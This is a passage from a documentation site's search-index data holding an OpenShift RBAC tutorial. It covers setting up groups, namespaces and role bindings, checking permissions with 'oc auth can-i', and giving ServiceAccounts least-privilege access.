The RBAC Trinity","text":"<p>Before running commands, it is essential to understand the three components that make RBAC work. Think of it as a sentence: \"This Subject can perform these Verbs on these Resources.\"</p> <ul> <li>Subject: The \"Who\" (User, Group, or ServiceAccount).</li> <li>Role / ClusterRole: The \"What\" (A list of rules: get, list, watch, create, etc.).</li> <li>RoleBinding: The \"Glue\" (Connects a Subject to a Role within a specific Namespace).</li> </ul>"},{"location":"rbac/rbac-intro/#2-identity-management-the-source-of-truth","title":"2. Identity Management: The Source of Truth","text":""},{"location":"rbac/rbac-intro/#why-groups-matter","title":"Why Groups Matter","text":"<p>In production, users are managed in external systems like Active Directory or Okta. We use Groups because they provide a layer of abstraction. If a developer leaves the company, you remove them from the AD Group, and their OpenShift access vanishes automatically\u2014no changes to the cluster required.</p>"},{"location":"rbac/rbac-intro/#step-1-simulate-the-identity-provider","title":"Step 1: Simulate the Identity Provider","text":"<pre><code># Create simulated users\noc create user frontend-dev\noc create user backend-dev\noc create user payment-admin\n\n# Create functional groups\noc adm groups new frontend-team\noc adm groups new backend-team\noc adm groups new payment-team\n\n# Map users to groups\noc adm groups add-users frontend-team frontend-dev\noc adm groups add-users backend-team backend-dev\noc adm groups add-users payment-team payment-admin\n</code></pre>"},{"location":"rbac/rbac-intro/#step-2-create-the-project-structure","title":"Step 2: Create the Project Structure","text":"<p>Create the three namespaces that represent our application tiers:</p> <pre><code>oc new-project frontend\noc new-project backend\noc new-project payments\n</code></pre>"},{"location":"rbac/rbac-intro/#3-the-permission-strategy-matrix","title":"3. The Permission Strategy Matrix","text":"<p>A \"proper\" RBAC implementation starts with a requirements matrix. We use OpenShift\u2019s Default Local Roles:</p> <ul> <li>Admin: Full power within the project (can grant permissions to others).</li> <li>Edit: Can create/modify/delete most resources (Pods, Services) but cannot manage permissions.</li> <li>View: Read-only access. Importantly, cannot see Secrets.</li> </ul> Team Namespace: <code>frontend</code> Namespace: <code>backend</code> Namespace: <code>payments</code> Frontend Team Edit (Owner) View (Logs/API) \u26d4 No Access Backend Team View (Integration) Edit (Owner) View (Connectivity) Payment Team \u26d4 No Access \u26d4 No Access Admin (Security Owner)"},{"location":"rbac/rbac-intro/#4-applying-the-glue-role-bindings","title":"4. Applying the Glue (Role Bindings)","text":"<p>When we run <code>add-role-to-group</code>, OpenShift creates a RoleBinding object inside that namespace.</p>"},{"location":"rbac/rbac-intro/#frontend-backend-access","title":"Frontend &amp; Backend Access","text":"<pre><code># Frontend owns 'frontend', views 'backend'\noc adm policy add-role-to-group edit frontend-team -n frontend\noc adm policy add-role-to-group view frontend-team -n backend\n\n# Backend owns 'backend', views 'frontend' and 'payments'\noc adm policy add-role-to-group edit backend-team -n backend\noc adm policy add-role-to-group view backend-team -n frontend\noc adm policy add-role-to-group view backend-team -n payments\n</code></pre>"},{"location":"rbac/rbac-intro/#high-security-payment-access","title":"High-Security Payment Access","text":"<pre><code># Payment Admin gets 'admin' role for full lifecycle management\noc adm policy add-role-to-group admin payment-team -n payments\n</code></pre>"},{"location":"rbac/rbac-intro/#5-verification-the-can-i-audit","title":"5. Verification: The \"Can-I\" Audit","text":"<p>The <code>oc auth can-i</code> command is the most powerful tool for a security admin. It allows you to impersonate a user to verify your logic.</p>"},{"location":"rbac/rbac-intro/#scenario-the-view-role-security-check","title":"Scenario: The \"View\" Role Security Check","text":"<p>A common mistake is thinking <code>view</code> can see everything. Let's test the Backend Developer trying to look at Payment Secrets:</p> <pre><code># Can I see the pods in payments?\n# Result: YES (View allows this)\noc auth can-i get pods -n payments --as=backend-dev\n\n# Can I see the database passwords (Secrets) in payments?\n# Result: NO (View role explicitly excludes Secrets for security)\noc auth can-i get secrets -n payments --as=backend-dev\n</code></pre> <p>Insight: This is why we use <code>view</code> for cross-team debugging. It allows developers to see logs and statuses without exposing sensitive credentials like API keys or database passwords.</p>"},{"location":"rbac/rbac-intro/#6-pro-tip-inspecting-the-binding","title":"6. Pro-Tip: Inspecting the Binding","text":"<p>To see the \"proper\" technical object created by these commands, you can inspect the RoleBinding directly:</p> <pre><code>oc get rolebinding -n payments\n</code></pre> <p>This will show you exactly which group is tied to which role, providing an audit trail for your security team.</p>"},{"location":"rbac/rbac-intro/#7-machine-identities-serviceaccounts","title":"7. Machine Identities: ServiceAccounts","text":"<p>While Groups are for humans, ServiceAccounts are for your applications. If your <code>backend</code> microservice needs to query the OpenShift API to find the IP of the <code>payment</code> service, it needs its own identity.</p>"},{"location":"rbac/rbac-intro/#step-1-create-the-serviceaccount","title":"Step 1: Create the ServiceAccount","text":"<pre><code># Create a dedicated identity for the application\noc create sa backend-app-sa -n backend\n</code></pre>"},{"location":"rbac/rbac-intro/#step-2-grant-api-access","title":"Step 2: Grant API Access","text":"<p>Applications should also follow the Least Privilege model. We grant the <code>backend</code> application service account the <code>view</code> role in the <code>payments</code> namespace so it can perform service discovery.</p> <pre><code># Grant 'view' to the ServiceAccount specifically\noc adm policy add-role-to-user view \\\n    system:serviceaccount:backend:backend-app-sa \\\n    -n payments\n</code></pre>"},{"location":"rbac/rbac-intro/#step-3-verification-the-machine-check","title":"Step 3: Verification (The Machine Check)","text":"<pre><code># Can the backend microservice list pods in payments?\n# Result: YES\noc auth can-i get pods -n payments \\\n    --as=system:serviceaccount:backend:backend-app-sa\n\n# Can the backend microservice delete pods in payments?\n# Result: NO\noc auth can-i delete pods -n payments \\\n    --as=system:serviceaccount:backend:backend-app-sa\n</code></pre>"}]}